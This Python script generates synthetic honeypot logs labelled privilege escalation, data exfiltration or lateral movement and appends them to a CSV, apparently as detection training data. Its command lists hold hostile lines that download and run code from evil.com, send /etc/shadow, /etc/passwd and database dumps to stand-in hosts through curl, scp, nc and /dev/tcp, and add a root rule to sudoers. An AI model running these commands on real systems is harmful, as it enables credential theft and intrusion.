import pandas as pd
import random
import datetime

# Base dataset to append to
DATA_PATH = "data/synthetic_honeypot_logs_1000.csv"

# New categories
CATEGORIES = [
    "privilege_escalation",
    "data_exfiltration",
    "lateral_movement"
]

def generate_privilege_escalation():
    commands = [
        "sudo su -",
        "sudo -l",
        "find / -perm -u=s -type f 2>/dev/null",
        "cat /etc/sudoers",
        "echo 'root ALL=(ALL:ALL) ALL' >> /etc/sudoers",
        "wget http://evil.com/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh",
        "curl -L http://evil.com/dirtycow -o /tmp/dirtycow && chmod +x /tmp/dirtycow && /tmp/dirtycow",
        "pkexec --version",
    ]
    return random.choice(commands)

def generate_data_exfiltration():
    commands = [
        "tar -czvf /tmp/backup.tar.gz /var/www/html && curl -X POST -F 'file=@/tmp/backup.tar.gz' http://evil.com/upload",
        "cat /etc/passwd > /dev/tcp/1.2.3.4/9001",
        "scp -i ~/.ssh/id_rsa /etc/shadow user@evil.com:/tmp/",
        "base64 /etc/shadow | curl -d @- http://evil.com/exfil",
        "zip -r /tmp/data.zip /home/user/documents && nc 1.2.3.4 4444 < /tmp/data.zip",
        "mysqldump -u root -p password database > /tmp/db.sql && curl -T /tmp/db.sql ftp://evil.com/upload",
    ]
    return random.choice(commands)

def generate_lateral_movement():
    commands = [
        "ssh root@10.0.0.12",
        "sshpass -p 'password' ssh admin@192.168.1.50",
        "net int ipv4 add route 10.0.0.0/24",
        "nmap -sn 192.168.1.0/24",
        "nc -zv 10.0.0.5 22",
        "psexec.exe \\\\192.168.1.100 -s cmd.exe",
        "wmic /node:192.168.1.100 process call create 'cmd.exe'",
        "proxychains ssh user@10.0.0.5"
    ]
    return random.choice(commands)


def generate_synthetic_data(num_samples=300):
    start_time = datetime.datetime.now() - datetime.timedelta(days=365)
    
    # Read existing
    try:
        df_exist = pd.read_csv(DATA_PATH)
        max_id = df_exist['id'].str.extract(r'(\d+)').astype(float).max().iloc[0]
        if pd.isna(max_id): max_id = 0
        start_id = int(max_id) + 1
    except:
        start_id = 1
        
    data = []
    
    for i in range(num_samples):
        cat = random.choice(CATEGORIES)
        if cat == "privilege_escalation":
            log = generate_privilege_escalation()
        elif cat == "data_exfiltration":
            log = generate_data_exfiltration()
        else:
            log = generate_lateral_movement()
            
        timestamp = (start_time + datetime.timedelta(days=random.uniform(0, 365))).isoformat() + "Z"
        
        data.append({
            "id": f"log-{start_id + i}",
            "timestamp": timestamp,
            "log": log,
            "label": cat
        })
        
    return pd.DataFrame(data)

if __name__ == "__main__":
    print(f"Generating new data...")
    new_df = generate_synthetic_data(300)
    print(new_df['label'].value_counts())
    
    # Append
    print(f"Appending to {DATA_PATH}...")
    try:
        existing_df = pd.read_csv(DATA_PATH)
        combined_df = pd.concat([existing_df, new_df], ignore_index=True)
        combined_df.to_csv(DATA_PATH, index=False)
        print(f"Success! Total rows: {len(combined_df)}")
    except Exception as e:
        print(f"Error appending: {e}")
        new_df.to_csv(DATA_PATH, index=False)
        print("Created new file.")
